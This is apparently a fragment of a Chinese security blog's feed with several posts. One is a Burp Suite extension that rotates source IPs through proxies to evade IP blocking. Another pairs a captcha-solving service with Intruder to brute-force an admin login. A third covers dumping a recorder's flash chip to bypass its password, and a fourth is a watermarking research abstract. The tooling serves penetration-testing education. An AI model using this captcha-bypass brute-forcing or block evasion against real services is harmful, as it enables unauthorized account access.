class="params">(self, callbacks)</span>:</span></span><br><span class="line"></span><br><span class="line">        self._callbacks = callbacks</span><br><span class="line">        self._helpers = callbacks.getHelpers()</span><br><span class="line">        callbacks.setExtensionName(<span class="string">"IP switch"</span>)</span><br><span class="line">        callbacks.registerHttpListener(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">processHttpMessage</span><span class="params">(self, toolFlag, messageIsRequest, messageInfo)</span>:</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 只处理请求</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> messageIsRequest:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        httpService = messageInfo.getHttpService()</span><br><span class="line">        <span class="comment"># 修改请求目标为代理中转</span></span><br><span class="line">        messageInfo.setHttpService(</span><br><span class="line">                        self.helpers.buildHttpService(</span><br><span class="line">                            HTTP_PROXY[<span class="string">'ip'</span>],</span><br><span class="line">                            HTTP_PROXY[<span class="string">'port'</span>], <span class="keyword">True</span></span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">  </span><br><span class="line">        requestInfo = self.helpers.analyzeRequest(messageInfo)</span><br><span class="line">        new_headers = requestInfo.headers</span><br><span class="line">        <span class="comment"># 修改 http 头</span></span><br><span class="line">        req_head = new_headers[<span class="number">0</span>]</span><br><span class="line">        new_headers[<span class="number">0</span>] = re.sub(<span class="string">'\/'</span>,<span class="string">" http://myip.ipip.net/"</span>,req_head)</span><br><span class="line">        body = messageInfo.request[requestInfo.getBodyOffset():len(messageInfo.request)]</span><br><span class="line">        messageInfo.request = self.helpers.buildHttpMessage(</span><br><span class="line">                            new_headers,</span><br><span class="line">                            body)</span><br></pre></td></tr></table></figure><h3 id="对接平台"><a href="#对接平台" class="headerlink" title="对接平台"></a>对接平台</h3><p>接入代理平台或者 aws</p><h2 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h2><p>继续使用上篇后台做演示</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/1/15861746674877.jpg" alt="img"></p><p>正常访问</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/1/15862528749018.jpg" alt="img"></p><p>开启拓展</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/1/15862536452968.jpg" alt="img"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、HTTP 代理原理及实现（一）<br><a href="https://imququ.com/post/web-proxy.html" target="_blank" rel="noopener">https://imququ.com/post/web-proxy.html</a></p><p>2、 Burp Suite 文档<br> <a href="https://portswigger.net/burp/extender/api/burp/IHttpListener.html" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/burp/IHttpListener.html</a></p><p>3、使用AWS API 网关动态绕过防火墙<br><a href="https://rhinosecuritylabs.com/aws/bypassing-ip-based-blocking-aws/" target="_blank" rel="noopener">https://rhinosecuritylabs.com/aws/bypassing-ip-based-blocking-aws/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇文章给 Burp Suite 添加验证码识别技能点，对于现代化的渗透测试神器来说，自动化切换 ip 也是必备技能，本文通过动态设置 HT
      
    
    </summary>
    
      <category term="web安全" scheme="http://yaseng.org/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Burp Suite" scheme="http://yaseng.org/tags/Burp-Suite/"/>
    
      <category term="代理 ip" scheme="http://yaseng.org/tags/%E4%BB%A3%E7%90%86-ip/"/>
    
      <category term="渗透测试" scheme="http://yaseng.org/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>强化 web 攻击神器 Burp Suite (一) — 验证码识别技能点</title>
    <link href="http://yaseng.org/burp-suite-captcha-crack-extension.html"/>
    <id>http://yaseng.org/burp-suite-captcha-crack-extension.html</id>
    <published>2020-02-18T16:00:00.000Z</published>
    <updated>2020-02-29T15:57:02.488Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，其各个组件之间可灵活配合，可定制化程度极高，正可谓居家旅行杀人越货必备之神器。但是当遇到各式各样的验证码，防火墙等场景，神器也无从下手。有幸 Burp Suite 提供了非常强大的开发接口，可根据需求自行强化，本文记录如何快速为 Burp Suite 添加验证码识别技能点 。</p><h2 id="快速开发"><a href="#快速开发" class="headerlink" title="快速开发"></a>快速开发</h2><p>既然要敏捷开发，采用轻量级的脚本 python 来实现拓展最为快速灵活，也懒得去拖 swing 界面做交互，参数对应修改就行。本次验证码识别用于 Intruder 模块，在脚本中实例化 IntruderPayloadGenerator 类以及其 getNextPayload 方法即可，具体流程如下 。</p><h3 id="抓取验证码请求"><a href="#抓取验证码请求" class="headerlink" title="抓取验证码请求"></a>抓取验证码请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#验证码请求头 </span></span><br><span class="line">headers = <span class="string">'''</span></span><br><span class="line"><span class="string">Host: ya.com</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:69.0) Gecko/20100301 Firefox/62.0</span></span><br><span class="line"><span class="string">Accept: image/webp,*/*</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://ya.com/cms/fastadmin/public/lf2EomShPI.php/index/login</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=vltk4df5fbn97vsf8mfjnobr71</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 验证码请求地址</span></span><br><span class="line">captcha_url = <span class="string">"http://ya.com/cms/fastadmin/public/index.php?s=/captcha"</span></span><br></pre></td></tr></table></figure><h3 id="对接验证码识别引擎"><a href="#对接验证码识别引擎" class="headerlink" title="对接验证码识别引擎"></a>对接验证码识别引擎</h3><p>可以使用深度学习来识别验证码，或者接入第三方通用平台。本文为了简单就直接对接某个打码平台，参考平台文档，引入 api、设置对应的id、key 等参数即可 。</p><h3 id="验证码-payload-生成"><a href="#验证码-payload-生成" class="headerlink" title="验证码 payload 生成"></a>验证码 payload 生成</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntruderPayloadGenerator</span><span class="params">(IIntruderPayloadGenerator)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._payloadIndex = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasMorePayloads</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getNextPayload</span><span class="params">(self, baseValue)</span>:</span></span><br><span class="line">        req = urllib2.Request(captcha_url, headers=headers)</span><br><span class="line">        response = urllib2.urlopen(req)</span><br><span class="line">        filename = <span class="string">"./tmp/"</span>+str(uuid.uuid1())+<span class="string">".png"</span></span><br><span class="line">        <span class="keyword">with</span> open(filename, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(response.read())</span><br><span class="line">        <span class="comment">#上传到打码平台识别</span></span><br><span class="line">        api             = Api(app_id, app_key, pd_id, pd_key)</span><br><span class="line">        rsp             = api.PredictFromFile(pred_type, filename) <span class="comment"># 返回识别结果的详细信息</span></span><br><span class="line">        payload = rsp.pred_rsp.value</span><br><span class="line">        <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h3 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h3><p><a href="https://github.com/yaseng/pentest/blob/master/misc/burp_captcha_crack.py" target="_blank" rel="noopener">https://github.com/yaseng/pentest/blob/master/misc/burp_captcha_crack.py</a></p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>拿一个后台系统来做演示<br><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/2/15825388049796.jpg" alt=""></p><h3 id="载入拓展"><a href="#载入拓展" class="headerlink" title="载入拓展"></a>载入拓展</h3><p>1、先引入 jython-standalone 包以及相关模块<br><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/2/15825386808896.jpg" alt=""></p><p>2、加载拓展 burp_captcha_crack.py  </p><h3 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h3><p>抓取验证码的请求头、url 写入脚本 </p><h3 id="设置-Intruder"><a href="#设置-Intruder" class="headerlink" title="设置 Intruder"></a>设置 Intruder</h3><p>这种场景下的暴力破解，需要自动化填入用户名、密码、验证码三个字段。对于前两个来说，一般是两个字典的迭代组合，后一个验证码不加入迭代计算。先标记用户名+密码，验证码两个变量，并且使用 Pitchfork 模式 。<br><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/2/15825516164583.jpg" alt=""><br>此时 payload1 为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">§admin&amp;password=admin232323§</span><br></pre></td></tr></table></figure></p><p>类型自定义迭代器(Custom interator)</p><ul><li>payload1_1 加载用户名字典</li><li>payload1_2 为空，分隔符 &amp;password= ，并且去掉 URL 自动编码选项</li><li>payload1_3 加载密码字典</li></ul><p>payload 2 类型 Extension-Generated<br>选择对应的拓展</p><h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/2/15825550704473.jpg" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、官方案例  <a href="https://portswigger.net/burp/extender#SampleExtensions" target="_blank" rel="noopener">https://portswigger.net/burp/extender#SampleExtensions</a><br>2、Burp Suite Extender reCAPTCHA <a href="https://github.com/bit4woo/reCAPTCHA" target="_blank" rel="noopener">https://github.com/bit4woo/reCAPTCHA</a><br>3、cnn 验证码识别 <a href="https://github.com/nickliqian/cnn_captcha" target="_blank" rel="noopener">https://github.com/nickliqian/cnn_captcha</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，其各个组件之间可灵活配合，可定制化程度极高，正可谓居家旅行杀人越货
      
    
    </summary>
    
      <category term="web安全" scheme="http://yaseng.org/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Burp Suite" scheme="http://yaseng.org/tags/Burp-Suite/"/>
    
      <category term="验证码识别" scheme="http://yaseng.org/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>可完全分离的二维矢量图加密域鲁棒可逆水印算法（一）</title>
    <link href="http://yaseng.org/separable-robust-reversible-watermarking-in-encrypted-2d-vector-graphics-1.html"/>
    <id>http://yaseng.org/separable-robust-reversible-watermarking-in-encrypted-2d-vector-graphics-1.html</id>
    <published>2019-12-25T16:00:00.000Z</published>
    <updated>2020-03-03T08:13:49.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>随着云制造技术的兴起，加密域可逆水印技术逐渐受到了较多的关注。然而，现有的大部分算法不仅只能应用于图像、视频等冗余性较大的载体，而且难以抵御常见的攻击，甚至只能在单一的域中提取水印。为此，本文针对冗余性较小的二维矢量图提出了一种可完全分离的二维矢量图加密域鲁棒可逆水印算法。首先，内容拥有者在极坐标系下利用加密密钥置乱顶点的极角以加密图形。随后，水印嵌入者在嵌入密钥以及哈希函数的控制下，把编码后的水印比特映射到不同顶点，再轻微调整顶点极角从而嵌入水印。由于解密操作不会影响已嵌入的水印，算法可以分别在明文域或密文域提取水印。实验结果与分析表明，算法不仅具有较好的不可见性，而且能有效抵御旋转、平移、缩放（RST）、实体重排序等常见的操作，甚至还能抵御顶点或实体的增加、删除等恶意攻击。</p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>近年来，随着计算机辅助设计/计算机辅助制造技术(CAD/CAM)的普及，二维矢量图在机械行业、建筑行业、服装业等诸多领域的设计行业中得到了广泛应用。二维矢量图作为一种重要的制造数据，其知识产权保护和内容完整性认证极其重要。虽然现有的水印方法[1]- [9]能对明文状态的二维矢量图进行一定程度的保护，但它们要么不可逆[1]-[3]，要么不够鲁棒[4]-[9]，更重要的是无法适应当前云制造发展的应用需要。由于存储在云端的二维矢量图完全暴露给第三方，数据易被泄密，故通常采用数据加密的方式对二维矢量图的内容进行保护。与此同时，为便于云端加密数据的管理，管理者还希望在加密的二维矢量图中以可逆的方式添加一些额外的信息，如：源信息、身份验证数据或版权信息等。为解决这一问题，加密域可逆信息隐藏技术在近几年受到了广泛关注。该技术首先对载体进行加密以确保数据的安全性，然后通过可逆水印技术把水印信息嵌入到载体中以实现版权保护、秘密信息传递等功能。<br>当前，针对加密域可逆信息隐藏的研究主要集中于栅格图像[10]-[20]，针对于二维矢量图的研究还相对较少[21]。此外，现有加密域可逆水印算法大多不具有水印提取的鲁棒性，即对解密后的载体进行一定程度的修改后，无法正确提取水印，无法满足版权认证、载体溯源等应用场景的需要。因此，如何提高加密域可逆水印算法中水印提取的鲁棒性已成为加密域可逆信息隐藏领域需要解决的一个重要问题。为此，本文提出了一个可完全分离的二维矢量图加密域鲁棒可逆水印算法。本文的贡献主要包括：<br>1、提出了一个可完全分离的二维矢量图加密域鲁棒可逆水印方案。据公开文献，该方案是首个能分别在明文域或密文域中鲁棒提取隐藏信息的矢量图水印方案。<br>2、提出了一种基于图形极坐标系统、哈希消息认证码和纠删编码的水印映射方法。分析了水印冗余度与水印满射概率的关系。实验证明，与现有同类算法相比，该水印映射方法对一些常见的操作和恶意攻击都具有良好的鲁棒性。<br>3、从理论上分析了二维矢量图形水印的最大失真与平均失真的界限，实验结果也验证了理论分析的正确性。此外，对所提出的算法的实验与分析表明，所提出算法不仅可逆且具有良好的不可见性。</p><p>文章的剩余部分组织如下：第2部分对现有加密域可逆水印的相关工作进行了介绍和分析；第3部分介绍了本文用到的相关技术；第4部分提出一个二维矢量图加密域可逆水印算法；第5部分是实验结果与分析；第6部分是结论。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><p>加密域信息隐藏在早期研究阶段，只是简单地把加密和信息隐藏结合，把载体数据的一部分用来加密，而把其余部分则用于嵌入信息。比如，Lian S等人提出的面向视频压缩的可交换加密和水印算法[22]。算法只对帧内预测模式、运动矢量差和DCT系数的符号进行加密，而将水印嵌入到DCT系数的幅值中。由于该类方法只加密了部分载体，当载体的数据相关度较高时存在信息泄露的风险。目前，现有研究均有机地结合两种技术，已有方法根据在加密前后腾出嵌入空间的不同可分为两大类：加密前腾空间(VRBE)以及加密后腾空间(VRAE)[23]。 </p><h3 id="加密前腾空间"><a href="#加密前腾空间" class="headerlink" title="加密前腾空间"></a>加密前腾空间</h3><p>VRBE类的算法需要在加密之前执行额外的预处理操作，以此为待嵌入的信息腾出空间。Kede Ma等人率先提出了第一个VRBE方法[10]，在该方法中，内容拥有者通过传统的可逆信息隐藏方法[24]将特定像素的最低有效位（LSB）嵌入到其他像素中从而腾出空间。预处理后的图像经加密后传送给数据隐藏者。数据隐藏者可以直接在这些特定像素的LSB中隐藏信息。Yi等人提出了一个基于二进制块嵌入（BBE）方法的加密图像可逆信息隐藏方法[11]。该方法通过BBE腾出空间并加密图像后，即可以把秘密信息嵌入其中。Cao等人提出了一个基于稀疏块表示形式的大容量加密图像可逆信息隐藏方法[12]。该方法通过稀疏块表示形式产生了具有更小信息熵的预测误差序列从而腾出了更大的空间，使算法具有更高的容量。然而，由于此类方法中要求内容拥有者与数据隐藏者进行协商，存在信息泄露的风险。  </p><h3 id="加密后腾空间"><a href="#加密后腾空间" class="headerlink" title="加密后腾空间"></a>加密后腾空间</h3><p>VRAE与前一种方法相比，原始载体在加密前无需经受额外的预处理。基于提取隐藏信息的时机，VRAE方法又可以进一步划分为三个基本类别：明文域提取算法，密文域提取算法，以及双域提取算法。</p><h4 id="明文域提取算法"><a href="#明文域提取算法" class="headerlink" title="明文域提取算法"></a>明文域提取算法</h4><p>张新鹏提出了第一个明文域提取算法[13]。该算法对图像进行流加密之后，图像被分成若干大小相同不重叠的块，在密钥的控制下分块图像的像素分成两个集合，再根据水印翻转其中一个集合中像素的3 LSB将1比特嵌入到每个块中。在接收端，算法先对图像进行解密，再根据密钥对像素进行相同的集合划分，最后基于原始像素平滑的先验知识，利用波动函数比较两个像素集合的平滑度以提取水印与还原图像。该算法在纹理复杂的区域会出现较多错误。随后，Wien Hong等人提出了一个改进方法[14]。该方法通过先恢复出错概率较低的块，再利用已恢复块来辅助恢复其他块，从而降低了错误率。蒋瑞琪等人提出了一个基于加密3D网格模型的信息隐藏算法[25]。该算法通过整数化3D网格模型顶点坐标以用于流加密，随后根据三角面片的约束关系把顶点集分为调整集与不变集，再基于[13]中的方法来修改调整集中的顶点坐标以隐藏信息，最后利用角缺失曲率、三角形边长约束等先验知识提取水印与还原图形。由于上述算法都需要解密后才能提取信息，应用场景有限。</p><h4 id="密文域提取算法"><a href="#密文域提取算法" class="headerlink" title="密文域提取算法"></a>密文域提取算法</h4><p>与明文域提取算法不同，密文域提取算法在解密前提取数据。W. Puech等人提出了一个加密图像可逆信息隐藏方法[15]。在这个方案中，内容所有者通过高级加密标准（AES）对原始图像进行加密，而数据嵌入者则在每个包含<em>n</em>像素的块中嵌入1比特。在接收端，用户可在密钥的参与下直接提取隐藏信息，并通过分析局部标准差在明文域恢复原始图像。随后，张进一步提出了一种可分离的加密图像可逆信息隐藏方法[16]。在流加密图像后，算法把一些参数嵌入到少量的加密像素中，并压缩其他加密像素的<em>M</em> LSB，最后在腾出的空间中隐藏信息。根据所拥有的密钥，用户可以分别获得隐藏的信息、近似的图像，以及完全恢复的图形。随后，Mustafa S. Abdul Karim等人提出了一个用于加密域的通用可逆数据隐藏算法[26]。该方法利用Golomb-Rice编码为冗余的加密信号分配新的特征，并通过修改这些特征来实现可逆数据隐藏。然而，当加密信号的冗余性较低时，算法容量较小。在这些方法中，由于嵌入的数据只能在密文域中提取，因此拥有数据隐藏密钥的合法接收者无法从标记的解密载体中提取嵌入数据，其应用场景存在进一步拓展的可能。</p><h4 id="双域提取算法"><a href="#双域提取算法" class="headerlink" title="双域提取算法"></a>双域提取算法</h4><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/2.2.6.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/2.2.7.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/2.2.8.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/2.2.9.png" alt="img"> </p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/3.1%20.png" alt="img"> </p><h3 id="基于最小包围圆的极坐标系"><a href="#基于最小包围圆的极坐标系" class="headerlink" title="基于最小包围圆的极坐标系"></a>基于最小包围圆的极坐标系</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/3.1.1%20.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/t%201.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/3.1.2%20.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/3.1.3%20.png" alt="img"></h3><h3 id="基于HMAC的水印映射方法"><a href="#基于HMAC的水印映射方法" class="headerlink" title="基于HMAC的水印映射方法"></a>基于HMAC的水印映射方法</h3><h3 id="-1"><a href="#-1" class="headerlink" title=" "></a><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/3.2.1%20.png" alt="img"> <img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/t%202.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/3.2.2%20.png" alt="img"></h3><h3 id="纠删码"><a href="#纠删码" class="headerlink" title="纠删码"></a>纠删码</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/3.3%20.png" alt="img"><br><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/3.3.2%20.png" alt="img"> </p><h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/4.1%20.png" alt="img"></h2><h3 id="图形加密"><a href="#图形加密" class="headerlink" title="图形加密"></a>图形加密</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/4.1.1%20.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/t%203.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/4.1.2%20.png" alt="img"> </p><h3 id="水印嵌入"><a href="#水印嵌入" class="headerlink" title="水印嵌入"></a>水印嵌入</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/4.2.1%20.png" alt="img"><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6/4.2.2%20.png" alt="img">  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;随着云制造技术的兴起，加密域可逆水印技术逐渐受到了较多的关注。然而，现有的大部分算法不仅只能应用于图像、视频等冗余性较大的载体，而且难以抵御
      
    
    </summary>
    
      <category term="数据安全" scheme="http://yaseng.org/categories/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="加密域可逆水印" scheme="http://yaseng.org/tags/%E5%8A%A0%E5%AF%86%E5%9F%9F%E5%8F%AF%E9%80%86%E6%B0%B4%E5%8D%B0/"/>
    
      <category term="鲁棒可逆水印" scheme="http://yaseng.org/tags/%E9%B2%81%E6%A3%92%E5%8F%AF%E9%80%86%E6%B0%B4%E5%8D%B0/"/>
    
  </entry>
  
  <entry>
    <title>加密设备攻防(一）</title>
    <link href="http://yaseng.org/encryption-hardware-attack-and-defense-1.html"/>
    <id>http://yaseng.org/encryption-hardware-attack-and-defense-1.html</id>
    <published>2019-12-23T16:00:00.000Z</published>
    <updated>2020-03-01T08:29:24.143Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>​    随着电子信息产业的高速发展，电子产品对于各类数据处理的技术愈加强大，为人们的工作与社交带来了许多便捷与乐趣的同时，人们的日常生活对各类电子设备的依赖也显而易见，但是，一旦保管不当，我们存储其中的各类数据也将存在着不同程度的安全隐患，因此，随着人们数据安全意识的提高，加密型的电子设备在我们生活中越来越常见。</p><h3 id="硬件加密硬盘"><a href="#硬件加密硬盘" class="headerlink" title="硬件加密硬盘"></a><strong>硬件加密硬盘</strong></h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/1.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/2.jpg" alt="img"></p><h3 id="某加密录音笔"><a href="#某加密录音笔" class="headerlink" title="某加密录音笔"></a>某加密录音笔</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/3.jpg" alt="img"></p><h3 id="某加密手机u盘"><a href="#某加密手机u盘" class="headerlink" title="某加密手机u盘"></a><strong>某加密手机u盘</strong></h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/4.jpg" alt="img"></p><h3 id="硬件钱包"><a href="#硬件钱包" class="headerlink" title="硬件钱包"></a><strong>硬件钱包</strong></h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/5.jpg" alt="img"></p><h3 id="指纹加密u盘"><a href="#指纹加密u盘" class="headerlink" title="指纹加密u盘"></a><strong>指纹加密u盘</strong></h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/6.jpg" alt="img"></p><p>实现加解密的方法各式各样，硬件加密，软件加密甚至有部分奸商以高端加密为噱头挂羊头卖狗肉 ，本系列文章从数智安全研究院多年研究案例结合国内外技术来谈谈各式各样加密的安全性到。</p><h2 id="软件加密类"><a href="#软件加密类" class="headerlink" title="软件加密类"></a><strong>软件加密类</strong></h2><h3 id="某款录音笔的破解"><a href="#某款录音笔的破解" class="headerlink" title="某款录音笔的破解"></a><strong>某款录音笔的破解</strong></h3><p>​尽管现在智能手机已经是必备的产品，但录音笔的市场却已然广阔，核心在于手机的录音功能难以满足复杂录音环境下的各种需求，对音质、录音距离和保密性的等等要求，使录音笔的需求不减，目前市面上的录音笔基础功能类似，大多都具备加密功能，设置密码后，可以使录音文件不会泄密，但对于一般的中低端产品而言，很少会采用硬件加密的方案，对于此类加密产品，可以通过硬件修改进行破解，本文通过分析某款加密录音笔，介绍一种较为简单和低成本的破解思路。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/7.png" alt="img"></p><h4 id="硬件分析"><a href="#硬件分析" class="headerlink" title="硬件分析"></a><strong>硬件分析</strong></h4><p>​该款加密录音笔采用 ATJ3315D 作为主控芯片，是炬力芯片中一款成熟的音频主控芯片，内置 8G Nand flash 闪存芯片，Tsop48 脚封装，查看印字没有标明具体型号，可能是白片或黑片。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/8.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/9.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/10.jpg" alt="img"></p><h4 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a><strong>破解思路</strong></h4><p>​ 系统可以设置4位数的密码，总共有 10000 种可能，在存在密码的情况下，不输入密码或者输入错误的密码，连上电脑无法识别到可移动设备，主控芯片中应该做了相应逻辑的判断。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/11.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/12.jpg" alt="img"></p><p>​    根据硬件架构，主控芯片没有外置 EEPROM 芯片，密码的加密方式未知，也可能以明文形式存储，芯片内置 ROM 不会存储过多的程序资源和设置，输入正确密码电脑可以识别，并能查看所有录音文件，查看分区大小发现应该存在隐藏分区，可能录音笔的资源和配置都放在隐藏分区里，分区表可能也做了加密。尽管密码只有 4 位数字，但因为操作不便捷，以及输入密码错误3次就会关机，使得暴力破解非常麻烦，如果通过外部飞线和硬改电路进行暴力破解，花费的时间和成本又过高，因此采用另外一种思路进行破解。</p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h4 id="编程器读写"><a href="#编程器读写" class="headerlink" title="编程器读写"></a><strong>编程器读写</strong></h4><p>​如果密码存储在 flash 芯片中，通过编程器直接读写芯片存储内容，或许会发现密码，首先拆下芯片进行读写，Tsop48 脚封装的可以采用对应的烧录座，只要注意芯片第一脚的位置即可。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/13.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2019/12/14.jpg" alt="img"></p><p>​芯片型号识别为：MT29F64G08CBAAA@TSOP48 ，是一款镁光的 8G 存储芯片。</p><p><img 